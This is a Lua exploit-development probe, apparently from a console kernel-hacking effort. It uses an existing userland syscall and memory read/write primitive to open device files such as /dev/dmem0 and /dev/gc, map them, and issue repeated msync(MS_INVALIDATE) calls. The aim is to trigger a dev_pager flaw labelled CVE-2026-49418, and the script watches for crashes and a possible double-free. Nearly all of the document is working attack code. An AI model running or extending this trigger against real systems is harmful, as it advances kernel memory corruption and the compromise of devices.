-- CRASH_CLASS: MODERATE
-- PROBE 58b: msync(MS_INVALIDATE) on DEVICE-BACKED mappings
--
-- Context: 58a tested msync on GPU anonymous mmap (fd=-1) — MS_INVALIDATE
-- returned -1. But CVE-2026-49418 targets the dev_pager, which handles
-- page faults for memory mapped through a device's d_mmap handler.
-- We need to mmap an actual /dev/* fd and try MS_INVALIDATE on that.
--
-- dmem0 and dmem1 are confirmed to open and mmap (probes 262a/263a).
-- /dev/gc and /dev/dce also open. This probe tests msync on device-fd
-- backed mappings to reach the vulnerable dev_pager code path.

print("=== PROBE 58b: MSYNC ON DEVICE-BACKED MAPPINGS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc_open   = mk(5)
local sc_mmap   = mk(477)
local sc_msync  = mk(65)
local sc_munmap = mk(73)
local sc_close  = mk(6)
local sc624     = mk(624)

local MS_ASYNC      = 1
local MS_INVALIDATE = 2
local PAGE = 0x4000

-- Helper: build path string in memory
local function put_path(base, s)
    local off = 0
    local dw = 0
    local shift = 0
    for i = 1, #s do
        local b = string.byte(s, i)
        dw = dw + b * (2 ^ shift)
        shift = shift + 8
        if shift == 32 then
            wd(base + off, dw)
            off = off + 4
            dw = 0
            shift = 0
        end
    end
    dw = dw + 0 * (2 ^ shift)
    shift = shift + 8
    if shift <= 32 then
        wd(base + off, dw)
    end
end

local pathbuf = memory.alloc(0x100)

-- Device list to try (confirmed open from device inventory)
local devices = {
    {"/dev/dmem0", 0x0002},   -- O_RDWR
    {"/dev/dmem1", 0x0002},   -- O_RDWR
    {"/dev/gc",    0x0002},   -- O_RDWR
    {"/dev/dce",   0x0000},   -- O_RDONLY
    {"/dev/zero",  0x0000},   -- O_RDONLY (for comparison)
}

for _, dev in ipairs(devices) do
    repeat  -- break to skip (Lua 5.1 has no goto)
    local path, flags = dev[1], dev[2]
    print("")
    print(string.format("[%s] flags=0x%X", path, flags))

    -- Open device
    put_path(N(pathbuf), path)
    local ok_open, fd = pcall(function()
        return sc_open(pathbuf, uint64(flags), uint64(0))
    end)
    local c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then
        print("  DIED on open!")
        return
    end
    if not ok_open then
        print("  open: PFAIL")
        break
    end
    local fd_n = N(fd)
    if fd_n < 0 or fd_n > 0xFFFF then
        print("  open: ret=" .. fd_n .. " (FAIL)")
        break
    end
    print("  open: fd=" .. fd_n)

    local prot = 0x01
    if flags == 0x0002 then prot = 0x03 end
    local map_size = PAGE * 4

    local ops_before = N(sc624())
    local ok_mmap, mmap_ret = pcall(function()
        return sc_mmap(
            uint64(0),
            uint64(map_size),
            uint64(prot),
            uint64(0x0001),     -- MAP_SHARED (not MAP_ANON, use fd)
            uint64(fd_n),
            uint64(0)
        )
    end)
    local ops_after = N(sc624())
    c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then
        print("  DIED on mmap!")
        return
    end

    if not ok_mmap then
        print("  mmap: PFAIL")
        pcall(function() sc_close(uint64(fd_n)) end)
        break
    end

    local mmap_h, mmap_l = get_hi_lo(mmap_ret)
    if mmap_h < 0 then mmap_h = mmap_h + 0x100000000 end
    if mmap_h >= 0xFFFF8000 or (mmap_h == 0 and mmap_l == 0) then
        print("  mmap: FAIL (ret=" .. fmt(mmap_ret) .. ")")
        pcall(function() sc_close(uint64(fd_n)) end)
        break
    end

    print("  mmap: " .. fmt(mmap_ret) .. " 624delta=" .. (ops_after - ops_before))

    local base_n = N(mmap_ret)
    local ok_rd, val_rd = pcall(function() return memory.read_dword(base_n) end)
    if ok_rd then
        local v = N(val_rd)
        if v < 0 then v = v + 0x100000000 end
        print(string.format("  read[0]: 0x%08X", v))
    else
        print("  read[0]: FAULT (page not backed)")
    end

    c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then
        print("  DIED on read!")
        return
    end

    -- msync MS_INVALIDATE on device-backed mapping
    print("  msync(MS_INVALIDATE)...")
    local ok_inv, ret_inv = pcall(function()
        return sc_msync(mmap_ret, uint64(map_size), uint64(MS_INVALIDATE))
    end)
    c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then
        print("  DIED on msync! >>> POSSIBLE CVE HIT <<<")
        return
    end
    if ok_inv then
        local rv = N(ret_inv)
        print("  msync ret=" .. rv)
        if rv == 0 then
            print("  >>> MS_INVALIDATE ACCEPTED ON DEVICE MAPPING <<<")

            local ok_rd2, val_rd2 = pcall(function() return memory.read_dword(base_n) end)
            if ok_rd2 then
                local v2 = N(val_rd2)
                if v2 < 0 then v2 = v2 + 0x100000000 end
                print(string.format("  post-invalidate read: 0x%08X", v2))
            else
                print("  post-invalidate read: FAULT >>> PAGES INVALIDATED <<<")
            end

            local ok_inv2, ret_inv2 = pcall(function()
                return sc_msync(mmap_ret, uint64(map_size), uint64(MS_INVALIDATE))
            end)
            c = N(native.fcall_with_rax(stub, 20))
            if c ~= pid then
                print("  DIED on 2nd msync >>> DOUBLE-FREE CRASH <<<")
                return
            end
            if ok_inv2 then
                print("  2nd msync ret=" .. N(ret_inv2))
            else
                print("  2nd msync: PFAIL")
            end
        else
            print("  (rejected)")
        end
    else
        print("  msync: PFAIL")
    end

    -- MS_INVALIDATE | MS_ASYNC (flag=3)
    print("  msync(INVALIDATE|ASYNC)...")
    local ok_inv3, ret_inv3 = pcall(function()
        return sc_msync(mmap_ret, uint64(map_size), uint64(MS_INVALIDATE + MS_ASYNC))
    end)
    c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then
        print("  DIED on msync(3)!")
        return
    end
    if ok_inv3 then
        print("  msync(3) ret=" .. N(ret_inv3))
    else
        print("  msync(3): PFAIL")
    end

    -- Cleanup
    pcall(function() sc_munmap(mmap_ret, uint64(map_size)) end)
    pcall(function() sc_close(uint64(fd_n)) end)

    until true  -- end of repeat block
    local cc = N(native.fcall_with_rax(stub, 20))
    if cc ~= pid then print("DIED!") return end
end

print("")
print("canary=" .. (N(native.fcall_with_rax(stub, 20)) == pid and "OK" or "FAIL"))
print("=== 58b COMPLETE ===")
